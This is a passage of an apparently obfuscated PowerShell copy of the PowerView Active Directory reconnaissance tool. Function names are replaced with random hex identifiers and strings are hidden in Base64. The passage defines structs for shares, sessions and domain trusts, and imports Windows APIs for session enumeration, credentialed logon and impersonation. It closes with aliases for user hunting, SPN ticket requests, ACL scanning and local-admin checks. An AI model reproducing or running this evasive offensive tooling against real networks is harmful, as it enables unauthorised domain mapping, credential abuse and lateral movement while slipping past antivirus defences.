    pFarmName = c3139b5db4b64607aa09334cd92daeb1 7 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${6845e7deaa864bfd9f953b68f1d7dd61} = d15bce5efdc644aeb61c61b619e06627 ${feb4a0b415b041b29c53659ea0db35b1} WTS_CLIENT_ADDRESS @{
    AddressFamily = c3139b5db4b64607aa09334cd92daeb1 0 UInt32
    Address = c3139b5db4b64607aa09334cd92daeb1 1 Byte[] -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AFYAYQBsAEEAcgByAGEAeQA='))), 20)
}
${544cb2fd3aa84a4db9e5c5d3dc63db8f} = d15bce5efdc644aeb61c61b619e06627 ${feb4a0b415b041b29c53659ea0db35b1} PowerView.ShareInfo @{
    Name = c3139b5db4b64607aa09334cd92daeb1 0 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Type = c3139b5db4b64607aa09334cd92daeb1 1 UInt32
    Remark = c3139b5db4b64607aa09334cd92daeb1 2 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${ec017cb89b21456b8f352543646882a5} = d15bce5efdc644aeb61c61b619e06627 ${feb4a0b415b041b29c53659ea0db35b1} PowerView.LoggedOnUserInfo @{
    UserName = c3139b5db4b64607aa09334cd92daeb1 0 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    LogonDomain = c3139b5db4b64607aa09334cd92daeb1 1 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    AuthDomains = c3139b5db4b64607aa09334cd92daeb1 2 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    LogonServer = c3139b5db4b64607aa09334cd92daeb1 3 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${707e8c719e474a6e9af27b6c807d0dba} = d15bce5efdc644aeb61c61b619e06627 ${feb4a0b415b041b29c53659ea0db35b1} PowerView.SessionInfo @{
    CName = c3139b5db4b64607aa09334cd92daeb1 0 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    UserName = c3139b5db4b64607aa09334cd92daeb1 1 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Time = c3139b5db4b64607aa09334cd92daeb1 2 UInt32
    IdleTime = c3139b5db4b64607aa09334cd92daeb1 3 UInt32
}
${324c335f13774d85a5f3f852867c4164} = bec1d6df361147498089ffb19fe424f1 ${feb4a0b415b041b29c53659ea0db35b1} SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}
${fa661204ee124231b77f6d8248eb4057} = d15bce5efdc644aeb61c61b619e06627 ${feb4a0b415b041b29c53659ea0db35b1} LOCALGROUP_INFO_1 @{
    lgrpi1_name = c3139b5db4b64607aa09334cd92daeb1 0 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lgrpi1_comment = c3139b5db4b64607aa09334cd92daeb1 1 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${e7301a72b6ae437d881d24511203f788} = d15bce5efdc644aeb61c61b619e06627 ${feb4a0b415b041b29c53659ea0db35b1} LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = c3139b5db4b64607aa09334cd92daeb1 0 IntPtr
    lgrmi2_sidusage = c3139b5db4b64607aa09334cd92daeb1 1 ${324c335f13774d85a5f3f852867c4164}
    lgrmi2_domainandname = c3139b5db4b64607aa09334cd92daeb1 2 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${f3f188f22d6e4e2481b1332badb03145} = bec1d6df361147498089ffb19fe424f1 ${feb4a0b415b041b29c53659ea0db35b1} DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -cf9dfce8ea264afa997fad3ee29f75b0
${b7c17234426c4a22bea3e9975b09d3ae} = bec1d6df361147498089ffb19fe424f1 ${feb4a0b415b041b29c53659ea0db35b1} DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
${07b66e71a60d43f6bdaf6c7e58438e73} = bec1d6df361147498089ffb19fe424f1 ${feb4a0b415b041b29c53659ea0db35b1} DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}
${fa7dfa09adfb47788db1c63ffaa7aca1} = d15bce5efdc644aeb61c61b619e06627 ${feb4a0b415b041b29c53659ea0db35b1} DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = c3139b5db4b64607aa09334cd92daeb1 0 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    DnsDomainName = c3139b5db4b64607aa09334cd92daeb1 1 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Flags = c3139b5db4b64607aa09334cd92daeb1 2 ${f3f188f22d6e4e2481b1332badb03145}
    ParentIndex = c3139b5db4b64607aa09334cd92daeb1 3 UInt32
    TrustType = c3139b5db4b64607aa09334cd92daeb1 4 ${b7c17234426c4a22bea3e9975b09d3ae}
    TrustAttributes = c3139b5db4b64607aa09334cd92daeb1 5 ${07b66e71a60d43f6bdaf6c7e58438e73}
    DomainSid = c3139b5db4b64607aa09334cd92daeb1 6 IntPtr
    DomainGuid = c3139b5db4b64607aa09334cd92daeb1 7 Guid
}
${763d2f16c1cf44e2b43076435231be83} = d15bce5efdc644aeb61c61b619e06627 ${feb4a0b415b041b29c53659ea0db35b1} NETRESOURCEW @{
    dwScope =         c3139b5db4b64607aa09334cd92daeb1 0 UInt32
    dwType =          c3139b5db4b64607aa09334cd92daeb1 1 UInt32
    dwDisplayType =   c3139b5db4b64607aa09334cd92daeb1 2 UInt32
    dwUsage =         c3139b5db4b64607aa09334cd92daeb1 3 UInt32
    lpLocalName =     c3139b5db4b64607aa09334cd92daeb1 4 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpRemoteName =    c3139b5db4b64607aa09334cd92daeb1 5 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpComment =       c3139b5db4b64607aa09334cd92daeb1 6 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpProvider =      c3139b5db4b64607aa09334cd92daeb1 7 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${decc85770a6d401da731a8672547f475} = @(
    (b4aa4392be8940b59c2306d96115e757 netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (b4aa4392be8940b59c2306d96115e757 netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (b4aa4392be8940b59c2306d96115e757 netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (b4aa4392be8940b59c2306d96115e757 netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (b4aa4392be8940b59c2306d96115e757 netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (b4aa4392be8940b59c2306d96115e757 netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (b4aa4392be8940b59c2306d96115e757 netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (b4aa4392be8940b59c2306d96115e757 netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (b4aa4392be8940b59c2306d96115e757 advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -c0294ad1afee4a2586e4daaa1497fbcf),
    (b4aa4392be8940b59c2306d96115e757 advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -c0294ad1afee4a2586e4daaa1497fbcf),
    (b4aa4392be8940b59c2306d96115e757 advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (b4aa4392be8940b59c2306d96115e757 advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -c0294ad1afee4a2586e4daaa1497fbcf),
    (b4aa4392be8940b59c2306d96115e757 advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -c0294ad1afee4a2586e4daaa1497fbcf),
    (b4aa4392be8940b59c2306d96115e757 advapi32 RevertToSelf ([Bool]) @() -c0294ad1afee4a2586e4daaa1497fbcf),
    (b4aa4392be8940b59c2306d96115e757 wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (b4aa4392be8940b59c2306d96115e757 wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -c0294ad1afee4a2586e4daaa1497fbcf),
    (b4aa4392be8940b59c2306d96115e757 wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -c0294ad1afee4a2586e4daaa1497fbcf),
    (b4aa4392be8940b59c2306d96115e757 wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (b4aa4392be8940b59c2306d96115e757 wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (b4aa4392be8940b59c2306d96115e757 wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (b4aa4392be8940b59c2306d96115e757 Mpr WNetAddConnection2W ([Int]) @(${763d2f16c1cf44e2b43076435231be83}, [String], [String], [UInt32])),
    (b4aa4392be8940b59c2306d96115e757 Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (b4aa4392be8940b59c2306d96115e757 kernel32 CloseHandle ([Bool]) @([IntPtr]) -c0294ad1afee4a2586e4daaa1497fbcf)
)
${ff6a81e818cd4360b071cc5c22705f57} = ${decc85770a6d401da731a8672547f475} | a211b3c58a89403e93b3d492ab11ff65 -d7dbf3b1fe6a4a52a65cdbdd80fc7a90 ${feb4a0b415b041b29c53659ea0db35b1} -c60ba45ebe9d4acd800c60abf2d83c04 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAA==')))
${94271fac322f428e9deaac6d91dfc36e} = ${ff6a81e818cd4360b071cc5c22705f57}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAYQBwAGkAMwAyAA==')))]
${010428763869431e80e18c1b0127d8f7} = ${ff6a81e818cd4360b071cc5c22705f57}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHYAYQBwAGkAMwAyAA==')))]
${60499e296285494c8693c29799a8735a} = ${ff6a81e818cd4360b071cc5c22705f57}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwB0AHMAYQBwAGkAMwAyAA==')))]
${ed9f34cd11954420929e66b24ca6afac} = ${ff6a81e818cd4360b071cc5c22705f57}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBwAHIA')))]
${7b9c84e547fc47d1bb3f80c1f9625ff8} = ${ff6a81e818cd4360b071cc5c22705f57}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAA==')))]
Set-Alias Get-IPAddress Resolve-IPAddress
Set-Alias Convert-NameToSid ConvertTo-SID
Set-Alias Convert-SidToName ConvertFrom-SID
Set-Alias Request-SPNTicket Get-DomainSPNTicket
Set-Alias Get-DNSZone Get-DomainDNSZone
Set-Alias Get-DNSRecord Get-DomainDNSRecord
Set-Alias Get-NetDomain Get-Domain
Set-Alias Get-NetDomainController Get-DomainController
Set-Alias Get-NetForest Get-Forest
Set-Alias Get-NetForestDomain Get-ForestDomain
Set-Alias Get-NetForestCatalog Get-ForestGlobalCatalog
Set-Alias Get-NetUser Get-DomainUser
Set-Alias Get-UserEvent Get-DomainUserEvent
Set-Alias Get-NetComputer Get-DomainComputer
Set-Alias Get-ADObject Get-DomainObject
Set-Alias Set-ADObject Set-DomainObject
Set-Alias Get-ObjectAcl Get-DomainObjectAcl
Set-Alias Add-ObjectAcl Add-DomainObjectAcl
Set-Alias Invoke-ACLScanner Find-InterestingDomainAcl
Set-Alias Get-GUIDMap Get-DomainGUIDMap
Set-Alias Get-NetOU Get-DomainOU
Set-Alias Get-NetSite Get-DomainSite
Set-Alias Get-NetSubnet Get-DomainSubnet
Set-Alias Get-NetGroup Get-DomainGroup
Set-Alias Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup
Set-Alias Get-NetGroupMember Get-DomainGroupMember
Set-Alias Get-NetFileServer Get-DomainFileServer
Set-Alias Get-DFSshare Get-DomainDFSShare
Set-Alias Get-NetGPO Get-DomainGPO
Set-Alias Get-NetGPOGroup Get-DomainGPOLocalGroup
Set-Alias Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
Set-Alias Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
Set-Alias Get-LoggedOnLocal Get-RegLoggedOn
Set-Alias Invoke-CheckLocalAdminAccess Test-AdminAccess
Set-Alias Get-SiteName Get-NetComputerSiteName
Set-Alias Get-Proxy Get-WMIRegProxy
Set-Alias Get-LastLoggedOn Get-WMIRegLastLoggedOn
Set-Alias Get-CachedRDPConnection Get-WMIRegCachedRDPConnection
Set-Alias Get-RegistryMountedDrive Get-WMIRegMountedDrive
Set-Alias Get-NetProcess Get-WMIProcess
Set-Alias Invoke-ThreadedFunction New-ThreadedFunction
Set-Alias Invoke-UserHunter Find-DomainUserLocation
Set-Alias Invoke-ProcessHunter Find-DomainProcess
Set-Alias Invoke-EventHunter Find-DomainUserEvent
Set-Alias Invoke-ShareFinder Find-DomainShare
Set-Alias Invoke-FileFinder Find-InterestingDomainShareFile
Set-Alias Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember
Set-Alias Get-NetDomainTrust Get-DomainTrust
Set-Alias Get-NetForestTrust Get-ForestTrust
Set-Alias Find-ForeignUser Get-DomainForeignUser
Set-Alias Find-ForeignGroup Get-DomainForeignGroupMember
Set-Alias Invoke-MapDomainTrust Get-DomainTrustMapping
Set-Alias Get-DomainPolicy Get-DomainPolicyData
